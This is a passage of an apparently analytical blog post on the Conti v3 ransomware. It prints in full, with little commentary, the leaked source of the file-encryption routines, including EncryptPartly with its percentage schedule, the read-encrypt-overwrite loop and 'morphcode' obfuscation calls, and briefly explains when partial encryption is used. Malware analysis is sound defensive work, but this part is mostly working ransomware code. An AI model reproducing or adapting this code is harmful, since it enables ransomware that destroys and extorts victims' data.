Buffer,</span></span><br><span class="line"><span class="params">	__in HCRYPTPROV CryptoProvider,</span></span><br><span class="line"><span class="params">	__in HCRYPTKEY PublicKey</span></span><br><span class="line"><span class="params">)</span></span><br><span class="line">&#123;</span><br><span class="line">	BOOL Success = FALSE;</span><br><span class="line">	DWORD BytesRead = <span class="number">0</span>;</span><br><span class="line">	DWORD BytesToRead = <span class="number">0</span>;</span><br><span class="line">	DWORD BytesToWrite = <span class="number">0</span>;</span><br><span class="line">	LONGLONG TotalRead = <span class="number">0</span>;</span><br><span class="line">	LONGLONG BytesToEncrypt;</span><br><span class="line">	LARGE_INTEGER Offset;</span><br><span class="line"></span><br><span class="line">	BytesToEncrypt = <span class="number">1048576</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> (TotalRead &lt; BytesToEncrypt) &#123;</span><br><span class="line"></span><br><span class="line">		morphcode(TotalRead);</span><br><span class="line"></span><br><span class="line">		LONGLONG BytesLeft = BytesToEncrypt - TotalRead;</span><br><span class="line"></span><br><span class="line">		morphcode(BytesLeft);</span><br><span class="line"></span><br><span class="line">		BytesToRead = BytesLeft &gt; BufferSize ? BufferSize : (DWORD)BytesLeft;</span><br><span class="line"></span><br><span class="line">		morphcode(BytesToRead);</span><br><span class="line"></span><br><span class="line">		Success = (BOOL)pReadFile(FileInfo-&gt;FileHandle, Buffer, BytesToRead, &amp;BytesRead, <span class="literal">NULL</span>);</span><br><span class="line">		<span class="keyword">if</span> (!Success || !BytesRead) &#123;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		morphcode(BytesRead);</span><br><span class="line"></span><br><span class="line">		TotalRead += BytesRead;</span><br><span class="line">		BytesToWrite = BytesRead;</span><br><span class="line"></span><br><span class="line">		morphcode(TotalRead);</span><br><span class="line"></span><br><span class="line">		ECRYPT_encrypt_bytes(&amp;FileInfo-&gt;CryptCtx, Buffer, Buffer, BytesRead);</span><br><span class="line"></span><br><span class="line">		morphcode(Buffer);</span><br><span class="line"></span><br><span class="line">		Offset.QuadPart = -((LONGLONG)BytesRead);</span><br><span class="line">		<span class="keyword">if</span> (!pSetFilePointerEx(FileInfo-&gt;FileHandle, Offset, <span class="literal">NULL</span>, FILE_CURRENT)) &#123;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		morphcode(Offset.QuadPart);</span><br><span class="line"></span><br><span class="line">		Success = WriteFullData(FileInfo-&gt;FileHandle, Buffer, BytesToWrite);</span><br><span class="line">		<span class="keyword">if</span> (!Success) &#123;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		morphcode(BytesToWrite);</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="EncryptPartly"><a href="#EncryptPartly" class="headerlink" title="EncryptPartly"></a>EncryptPartly</h4><p>if the file is Virtual Machine Extension, then EncryptPartly</p>
<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220429142152244.png" alt="image-20220429142152244"></p>
<p>if the filesize is over 5242880 byte, then EncryptPartly.</p>
<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220429142228715.png" alt="image-20220429142228715"></p>
<p>Judge the file size and decide how many percent the code wanna Encrypt.</p>
<blockquote>
<p>the global::GetEncrypSize return value is 50, so if the filesize is over 5242880, it will encrypt the 10% size data of this file.</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br></pre></td><td class="code"><pre><span class="line">STATIC</span><br><span class="line">BOOL</span><br><span class="line"><span class="title function_">EncryptPartly</span><span class="params">(</span></span><br><span class="line"><span class="params">	__in cryptor::LPFILE_INFO FileInfo,</span></span><br><span class="line"><span class="params">	__in LPBYTE Buffer,</span></span><br><span class="line"><span class="params">	__in HCRYPTPROV CryptoProvider,</span></span><br><span class="line"><span class="params">	__in HCRYPTKEY PublicKey,</span></span><br><span class="line"><span class="params">	__in BYTE DataPercent</span></span><br><span class="line"><span class="params">)</span></span><br><span class="line">&#123;</span><br><span class="line">	BOOL Success = FALSE;</span><br><span class="line">	DWORD BytesRead = <span class="number">0</span>;</span><br><span class="line">	DWORD BytesToRead = <span class="number">0</span>;</span><br><span class="line">	DWORD BytesToWrite = <span class="number">0</span>;</span><br><span class="line">	LONGLONG TotalRead = <span class="number">0</span>;</span><br><span class="line">	LONGLONG BytesToEncrypt;</span><br><span class="line">	LARGE_INTEGER Offset;</span><br><span class="line">	LONGLONG PartSize = <span class="number">0</span>;</span><br><span class="line">	LONGLONG StepSize = <span class="number">0</span>;</span><br><span class="line">	INT StepsCount = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">switch</span> (DataPercent) &#123;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">10</span>:</span><br><span class="line">		PartSize = (FileInfo-&gt;FileSize / <span class="number">100</span>) * <span class="number">4</span>;</span><br><span class="line">		morphcode(PartSize);</span><br><span class="line">		StepsCount = <span class="number">3</span>;</span><br><span class="line">		StepSize = (FileInfo-&gt;FileSize - (PartSize * <span class="number">3</span>)) / <span class="number">2</span>;</span><br><span class="line">		morphcode(StepSize);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">		</span><br><span class="line">	<span class="keyword">case</span> <span class="number">15</span>:</span><br><span class="line">		PartSize = (FileInfo-&gt;FileSize / <span class="number">100</span>) * <span class="number">5</span>;</span><br><span class="line">		morphcode(PartSize);</span><br><span class="line">		StepsCount = <span class="number">3</span>;</span><br><span class="line">		StepSize = (FileInfo-&gt;FileSize - (PartSize * <span class="number">3</span>)) / <span class="number">2</span>;</span><br><span class="line">		morphcode(StepSize);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">case</span> <span class="number">20</span>:</span><br><span class="line">		PartSize = (FileInfo-&gt;FileSize / <span class="number">100</span>) * <span class="number">7</span>;</span><br><span class="line">		morphcode(PartSize);</span><br><span class="line">		StepsCount = <span class="number">3</span>;</span><br><span class="line">		StepSize = (FileInfo-&gt;FileSize - (PartSize * <span class="number">3</span>)) / <span class="number">2</span>;</span><br><span class="line">		morphcode(StepSize);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">case</span> <span class="number">25</span>:</span><br><span class="line">		PartSize = (FileInfo-&gt;FileSize / <span class="number">100</span>) * <span class="number">9</span>;</span><br><span class="line">		morphcode(PartSize);</span><br><span class="line">		StepsCount = <span class="number">3</span>;</span><br><span class="line">		StepSize = (FileInfo-&gt;FileSize - (PartSize * <span class="number">3</span>)) / <span class="number">2</span>;</span><br><span class="line">		morphcode(StepSize);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">case</span> <span class="number">30</span>:</span><br><span class="line">		PartSize = (FileInfo-&gt;FileSize / <span class="number">100</span>) * <span class="number">10</span>;</span><br><span class="line">		morphcode(PartSize);</span><br><span class="line">		StepsCount = <span class="number">3</span>;</span><br><span class="line">		StepSize = (FileInfo-&gt;FileSize - (PartSize * <span class="number">3</span>)) / <span class="number">2</span>;</span><br><span class="line">		morphcode(StepSize);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">case</span> <span class="number">35</span>:</span><br><span class="line">		PartSize = (FileInfo-&gt;FileSize / <span class="number">100</span>) * <span class="number">12</span>;</span><br><span class="line">		morphcode(PartSize);</span><br><span class="line">		StepsCount = <span class="number">3</span>;</span><br><span class="line">		StepSize = (FileInfo-&gt;FileSize - (PartSize * <span class="number">3</span>)) / <span class="number">2</span>;</span><br><span class="line">		morphcode(StepSize);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">case</span> <span class="number">40</span>:</span><br><span class="line">		PartSize = (FileInfo-&gt;FileSize / <span class="number">100</span>) * <span class="number">14</span>;</span><br><span class="line">		morphcode(PartSize);</span><br><span class="line">		StepsCount = <span class="number">3</span>;</span><br><span class="line">		StepSize = (FileInfo-&gt;FileSize - (PartSize * <span class="number">3</span>)) / <span class="number">2</span>;</span><br><span class="line">		morphcode(StepSize);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">case</span> <span class="number">50</span>:</span><br><span class="line">		PartSize = (FileInfo-&gt;FileSize / <span class="number">100</span>) * <span class="number">10</span>;</span><br><span class="line">		morphcode(PartSize);</span><br><span class="line">		StepsCount = <span class="number">5</span>;</span><br><span class="line">		StepSize = PartSize;</span><br><span class="line">		morphcode(StepSize);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">case</span> <span class="number">60</span>:</span><br><span class="line">		PartSize = (FileInfo-&gt;FileSize / <span class="number">100</span>) * <span class="number">20</span>;</span><br><span class="line">		morphcode(PartSize);</span><br><span class="line">		StepsCount = <span class="number">3</span>;</span><br><span class="line">		StepSize = (FileInfo-&gt;FileSize - (PartSize * <span class="number">3</span>)) / <span class="number">2</span>;</span><br><span class="line">		morphcode(StepSize);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">case</span> <span class="number">70</span>:</span><br><span class="line">		PartSize = (FileInfo-&gt;FileSize / <span class="number">100</span>) * <span class="number">23</span>;</span><br><span class="line">		morphcode(PartSize);</span><br><span class="line">		StepsCount = <span class="number">3</span>;</span><br><span class="line">		StepSize = (FileInfo-&gt;FileSize - (PartSize * <span class="number">3</span>)) / <span class="number">2</span>;</span><br><span class="line">		morphcode(StepSize);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">case</span> <span class="number">80</span>:</span><br><span class="line">		PartSize = (FileInfo-&gt;FileSize / <span class="number">100</span>) * <span class="number">27</span>;</span><br><span class="line">		morphcode(PartSize);</span><br><span class="line">		StepsCount = <span class="number">3</span>;</span><br><span class="line">		StepSize = (FileInfo-&gt;FileSize - (PartSize * <span class="number">3</span>)) / <span class="number">2</span>;</span><br><span class="line">		morphcode(StepSize);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (INT i = <span class="number">0</span>; i &lt; StepsCount; i++) &#123;</span><br><span class="line"></span><br><span class="line">		TotalRead = <span class="number">0</span>;</span><br><span class="line">		BytesToEncrypt = PartSize;</span><br><span class="line">		morphcode(BytesToEncrypt);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (i != <span class="number">0</span>) &#123;</span><br><span class="line"></span><br><span class="line">			Offset.QuadPart = StepSize;</span><br><span class="line">			<span class="keyword">if</span> (!pSetFilePointerEx(FileInfo-&gt;FileHandle, Offset, <span class="literal">NULL</span>, FILE_CURRENT)) &#123;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			morphcode(Offset.QuadPart);</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">while</span> (TotalRead &lt; BytesToEncrypt) &#123;</span><br><span class="line"></span><br><span class="line">			morphcode(TotalRead);</span><br><span class="line"></span><br><span class="line">			LONGLONG BytesLeft = BytesToEncrypt - TotalRead;</span><br><span class="line">			morphcode(BytesLeft);</span><br><span class="line">			BytesToRead = BytesLeft &gt; BufferSize ? BufferSize : (DWORD)BytesLeft;</span><br><span class="line"></span><br><span class="line">			morphcode(BytesToRead);</span><br><span class="line"></span><br><span class="line">			Success = (BOOL)pReadFile(FileInfo-&gt;FileHandle, Buffer, BytesToRead, &amp;BytesRead, <span class="literal">NULL</span>);</span><br><span class="line">			<span class="keyword">if</span> (!Success || !BytesRead) &#123;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			morphcode(BytesRead);</span><br><span class="line"></span><br><span class="line">			TotalRead += BytesRead;</span><br><span class="line">			BytesToWrite = BytesRead;</span><br><span class="line"></span><br><span class="line">			morphcode(TotalRead);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">			ECRYPT_encrypt_bytes(&amp;FileInfo-&gt;CryptCtx, Buffer, Buffer, BytesRead);</span><br><span class="line"></span><br><span class="line">			Offset.QuadPart = -((LONGLONG)BytesRead);</span><br><span class="line">			<span class="keyword">if</span> (!pSetFilePointerEx(FileInfo-&gt;FileHandle, Offset, <span class="literal">NULL</span>, FILE_CURRENT)) &#123;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			morphcode(Offset.QuadPart);</span><br><span class="line"></span><br><span class="line">			Success = WriteFullData(FileInfo-&gt;FileHandle, Buffer, BytesToWrite);</span><br><span class="line">			<span class="keyword">if</span> (!Success) &#123;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			morphcode(BytesToWrite);</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="EncryptFull"><a href="#EncryptFull" class="headerlink" title="EncryptFull"></a>EncryptFull</h4><p>It’s the same as EncryptPartly function,just remove the percent argument.</p>
<blockquote>
<p>morphcode</p>
</blockquote>
<h3 id=""><a href="#" class="headerlink" title=""></a></h3></p><div class="tip">本文采用CC-BY-SA-3.0协议，转载请注明出处<br>Author: scr1pt</div></div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2022-04-30</span><i class="fa fa-tag"></i><a class="tag" href="/tags/Ransomeware-Conti-v3/" title="Ransomeware,Conti v3">Ransomeware,Conti v3 </a><span class="leancloud_visitors"></span><span>About 8233 words, 27 min 26 sec  read</span></div></div></div></div><div class="share"><div class="evernote"><a class="fa fa-bookmark" href="" onclick="javascript:join_favorite()" ref="sidebar"></a></div><div class="weibo"><a class="fa fa-weibo" href="javascript:void((function(s,d,e){try{}catch(e){}var f='http://service.weibo.com/share/share.php?',u=d.location.href,p=['url=',e(u),'&amp;title=',e(d.title),'&amp;appkey=2924220432'].join('');function a(){if(!window.open([f,p].join(''),'mb',['toolbar=0,status=0,resizable=1,width=620,height=450,left=',(s.width-620)/2,',top=',(s.height-450)/2].join('')))u.href=[f,p].join('');};if(/Firefox/.test(navigator.userAgent)){setTimeout(a,0)}else{a()}})(screen,document,encodeURIComponent));"></a></div><div class="twitter"><a class="fa fa-twitter" target="_blank" rel="noopener" href="http://twitter.com/home?status=,https://Scr1pt-kid.github.io/2022/04/30/conti v3 source code learning/,scr1pt's blog,Conti v3 Ransomeware Souce Code Analysis,;"></a></div></div><div class="pagination"><ul class="clearfix"><li class="next pagbuttons"><a class="btn" role="navigation" href="/2022/04/28/2021-12-16-hancitor/" title="2021-12-16-hancitor">Next</a></li></ul></div><script src="/js/visitors.js"></script></div></div></div></div><script src="/js/jquery-migrate-1.2.1.min.js"></script><script src="/js/jquery.appear.js"></script><script src="/js/add-bookmark.js"></script><script>(function(window){var INSIGHT_CONFIG={TRANSLATION:{POSTS:"Posts",PAGES:"Pages",CATEGORIES:"Categories",TAGS:"Tags",UNTITLED:"(Untitled)",},CONTENT_URL:"/content.json",};window.INSIGHT_CONFIG=INSIGHT_CONFIG})(window);</script><script src="/js/insight.js" defer></script><div class="searchbox ins-search"><div class="searchbox-container ins-search-container"><div class="searchbox-input-wrapper"><input class="searchbox-input ins-search-input" type="text" placeholder="Search..."><span class="searchbox-close"><a class="fa fa-times-circle" onclick="closeWindow();"></a></span></div><div class="searchbox-result-wrapper ins-section-wrapper"><div class="ins-section-container"><p>Seraching...</p></div></div></div></div></body></html>